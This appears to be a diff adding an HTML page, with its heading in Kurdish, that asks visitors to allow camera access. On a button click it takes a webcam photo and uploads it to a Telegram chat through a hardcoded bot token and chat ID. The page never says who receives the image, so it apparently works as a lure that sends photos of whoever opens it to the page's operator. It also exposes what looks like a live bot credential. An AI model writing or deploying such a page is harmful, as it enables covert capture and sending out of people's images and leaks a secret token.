@@ -1,0 +1,53 @@
+‏<!DOCTYPE html>
+‏<html>
+‏<head>
+‏  <title>Camera Capture</title>
+‏</head>
+‏<body style="text-align:center; font-family:sans-serif;">
+
+‏<h2>📸 تکایە Allow بکە بۆ کامێرا</h2>
+
+‏<video id="video" width="300" autoplay></video>
+‏<br><br>
+
+‏<button onclick="takePhoto()">📷 وێنە بگرە</button>
+
+‏<canvas id="canvas" width="300" height="200" style="display:none;"></canvas>
+
+‏<script>
+‏const video = document.getElementById('video');
+
+‏navigator.mediaDevices.getUserMedia({ video: true })
+‏.then(stream => {
+‏  video.srcObject = stream;
+})
+‏.catch(() => {
+‏  alert("کامێرا ڕێگەپێنەدرا");
+});
+
+// ✅ زانیاری خۆت (بێ space)
+‏const TOKEN = "8397400887:AAFEJtNdlZPnoppSnA6yYgpFI43pcyLBegI";
+‏const CHAT_ID = "1224442339";
+
+‏function takePhoto() {
+‏  const canvas = document.getElementById('canvas');
+‏  const ctx = canvas.getContext('2d');
+‏  ctx.drawImage(video, 0, 0, 300, 200);
+
+‏  canvas.toBlob(function(blob) {
+‏    let formData = new FormData();
+‏    formData.append("chat_id", CHAT_ID);
+‏    formData.append("photo", blob, "photo.png");
+
+‏    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+‏      method: "POST",
+‏      body: formData
+    })
+‏    .then(() => alert("✅ وێنە نێردرا"))
+‏    .catch(() => alert("❌ هەڵەیەک هەیە"));
+  });
+}
+‏</script>
+
+‏</body>
+‏</html>
